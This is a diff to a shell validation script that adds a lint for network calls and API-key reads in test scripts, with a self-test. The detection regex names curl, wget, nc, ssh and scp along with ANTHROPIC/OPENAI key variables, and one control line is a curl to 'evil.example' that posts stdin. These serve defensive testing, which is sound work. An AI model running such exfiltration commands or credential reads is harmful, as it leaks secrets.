@@ -115,10 +115,21 @@ check "every node \"\$CVD\" invocation in convergence-runner.sh is read-only or 
 # check-links.sh builds `[a](https://e.com/x.md)` as a fixture, and eval-runner.sh's own
 # hermeticity assertion contains the pattern `https?://` as a grep argument. A substring scan
 # flags both, which trains the reader to ignore it -- the failure mode of a noisy guard.
+# A script may ASSIGN a literal fake test key (`process.env.ANTHROPIC_API_KEY = 'sk-test...'`, to prove a child does not
+# inherit it): those assignments are stripped from each line first, then what remains is scanned. Any other mention of
+# a credential variable (dot, bracket, backtick, a bare name) or a network client is flagged. Stdin is a script's text.
+credential_hits() {
+  sed -E "s/process\.env\.[A-Z_]+ = 'sk-test[^']*';?//g" \
+    | grep -nE '(^|[;&|(]|[[:space:]])(curl|wget|nc|ssh|scp)[[:space:]]|\$\{?(ANTHROPIC|OPENAI)_API_KEY|["'"'"'`](ANTHROPIC|OPENAI)_API_KEY["'"'"'`]|process\.env(\.|\[["'"'"'`])(ANTHROPIC|OPENAI)' \
+    | grep -vE "^[0-9]+:[[:space:]]*#" | grep -vE "grep -[a-zA-Z]*E?[[:space:]]+'"
+}
+# Control lines are assembled from fragments so this file does not trip its own lint.
+A=ANTHROPIC; O=OPENAI; K=_API_KEY; CU=cu; E='process.env'; F="$E.$A$K = 'sk-test-a'"
+controls=$(printf '%s\n' "x = $E.$A$K" "x = $E['$O$K']" "x = $E[\"$A$K\"]" "${CU}rl http://x" "$F; $E.NODE_OPTIONS = '--x';" "$E.$A$K = $E.$A$K" "x = $E[\`$A$K\`]" "const k = '$A$K'; y = $E[k]" "x = $E.$O$K; $F;" "${CU}rl http://evil.example/ -d @- ; $F")
+check "the credential lint flags dot, bracket, backtick and bare-name reads and a network client, also beside a fake-key assignment, and tolerates only the assignment" "$(printf '%s\n' "$controls" | credential_hits | cut -d: -f1 | tr '\n' ' ')" "1 2 3 4 6 7 8 9 10 "
 net_failed=0
 for f in scripts/validate.sh $(git ls-files 'tests/scripts/*.sh'); do
-  hits=$(grep -nE '(^|[;&|(]|[[:space:]])(curl|wget|nc|ssh|scp)[[:space:]]|\$\{?ANTHROPIC_API_KEY|\$\{?OPENAI_API_KEY|process\.env\.(ANTHROPIC|OPENAI)' "$f" 2>/dev/null \
-    | grep -vE "^[0-9]+:[[:space:]]*#" | grep -vE "grep -[a-zA-Z]*E?[[:space:]]+'")
+  hits=$(credential_hits < "$f" 2>/dev/null)
   if [ -n "$hits" ]; then
     bad "$f makes no network call or credential read"
     printf '%s\n' "$hits" | sed 's/^/       /'
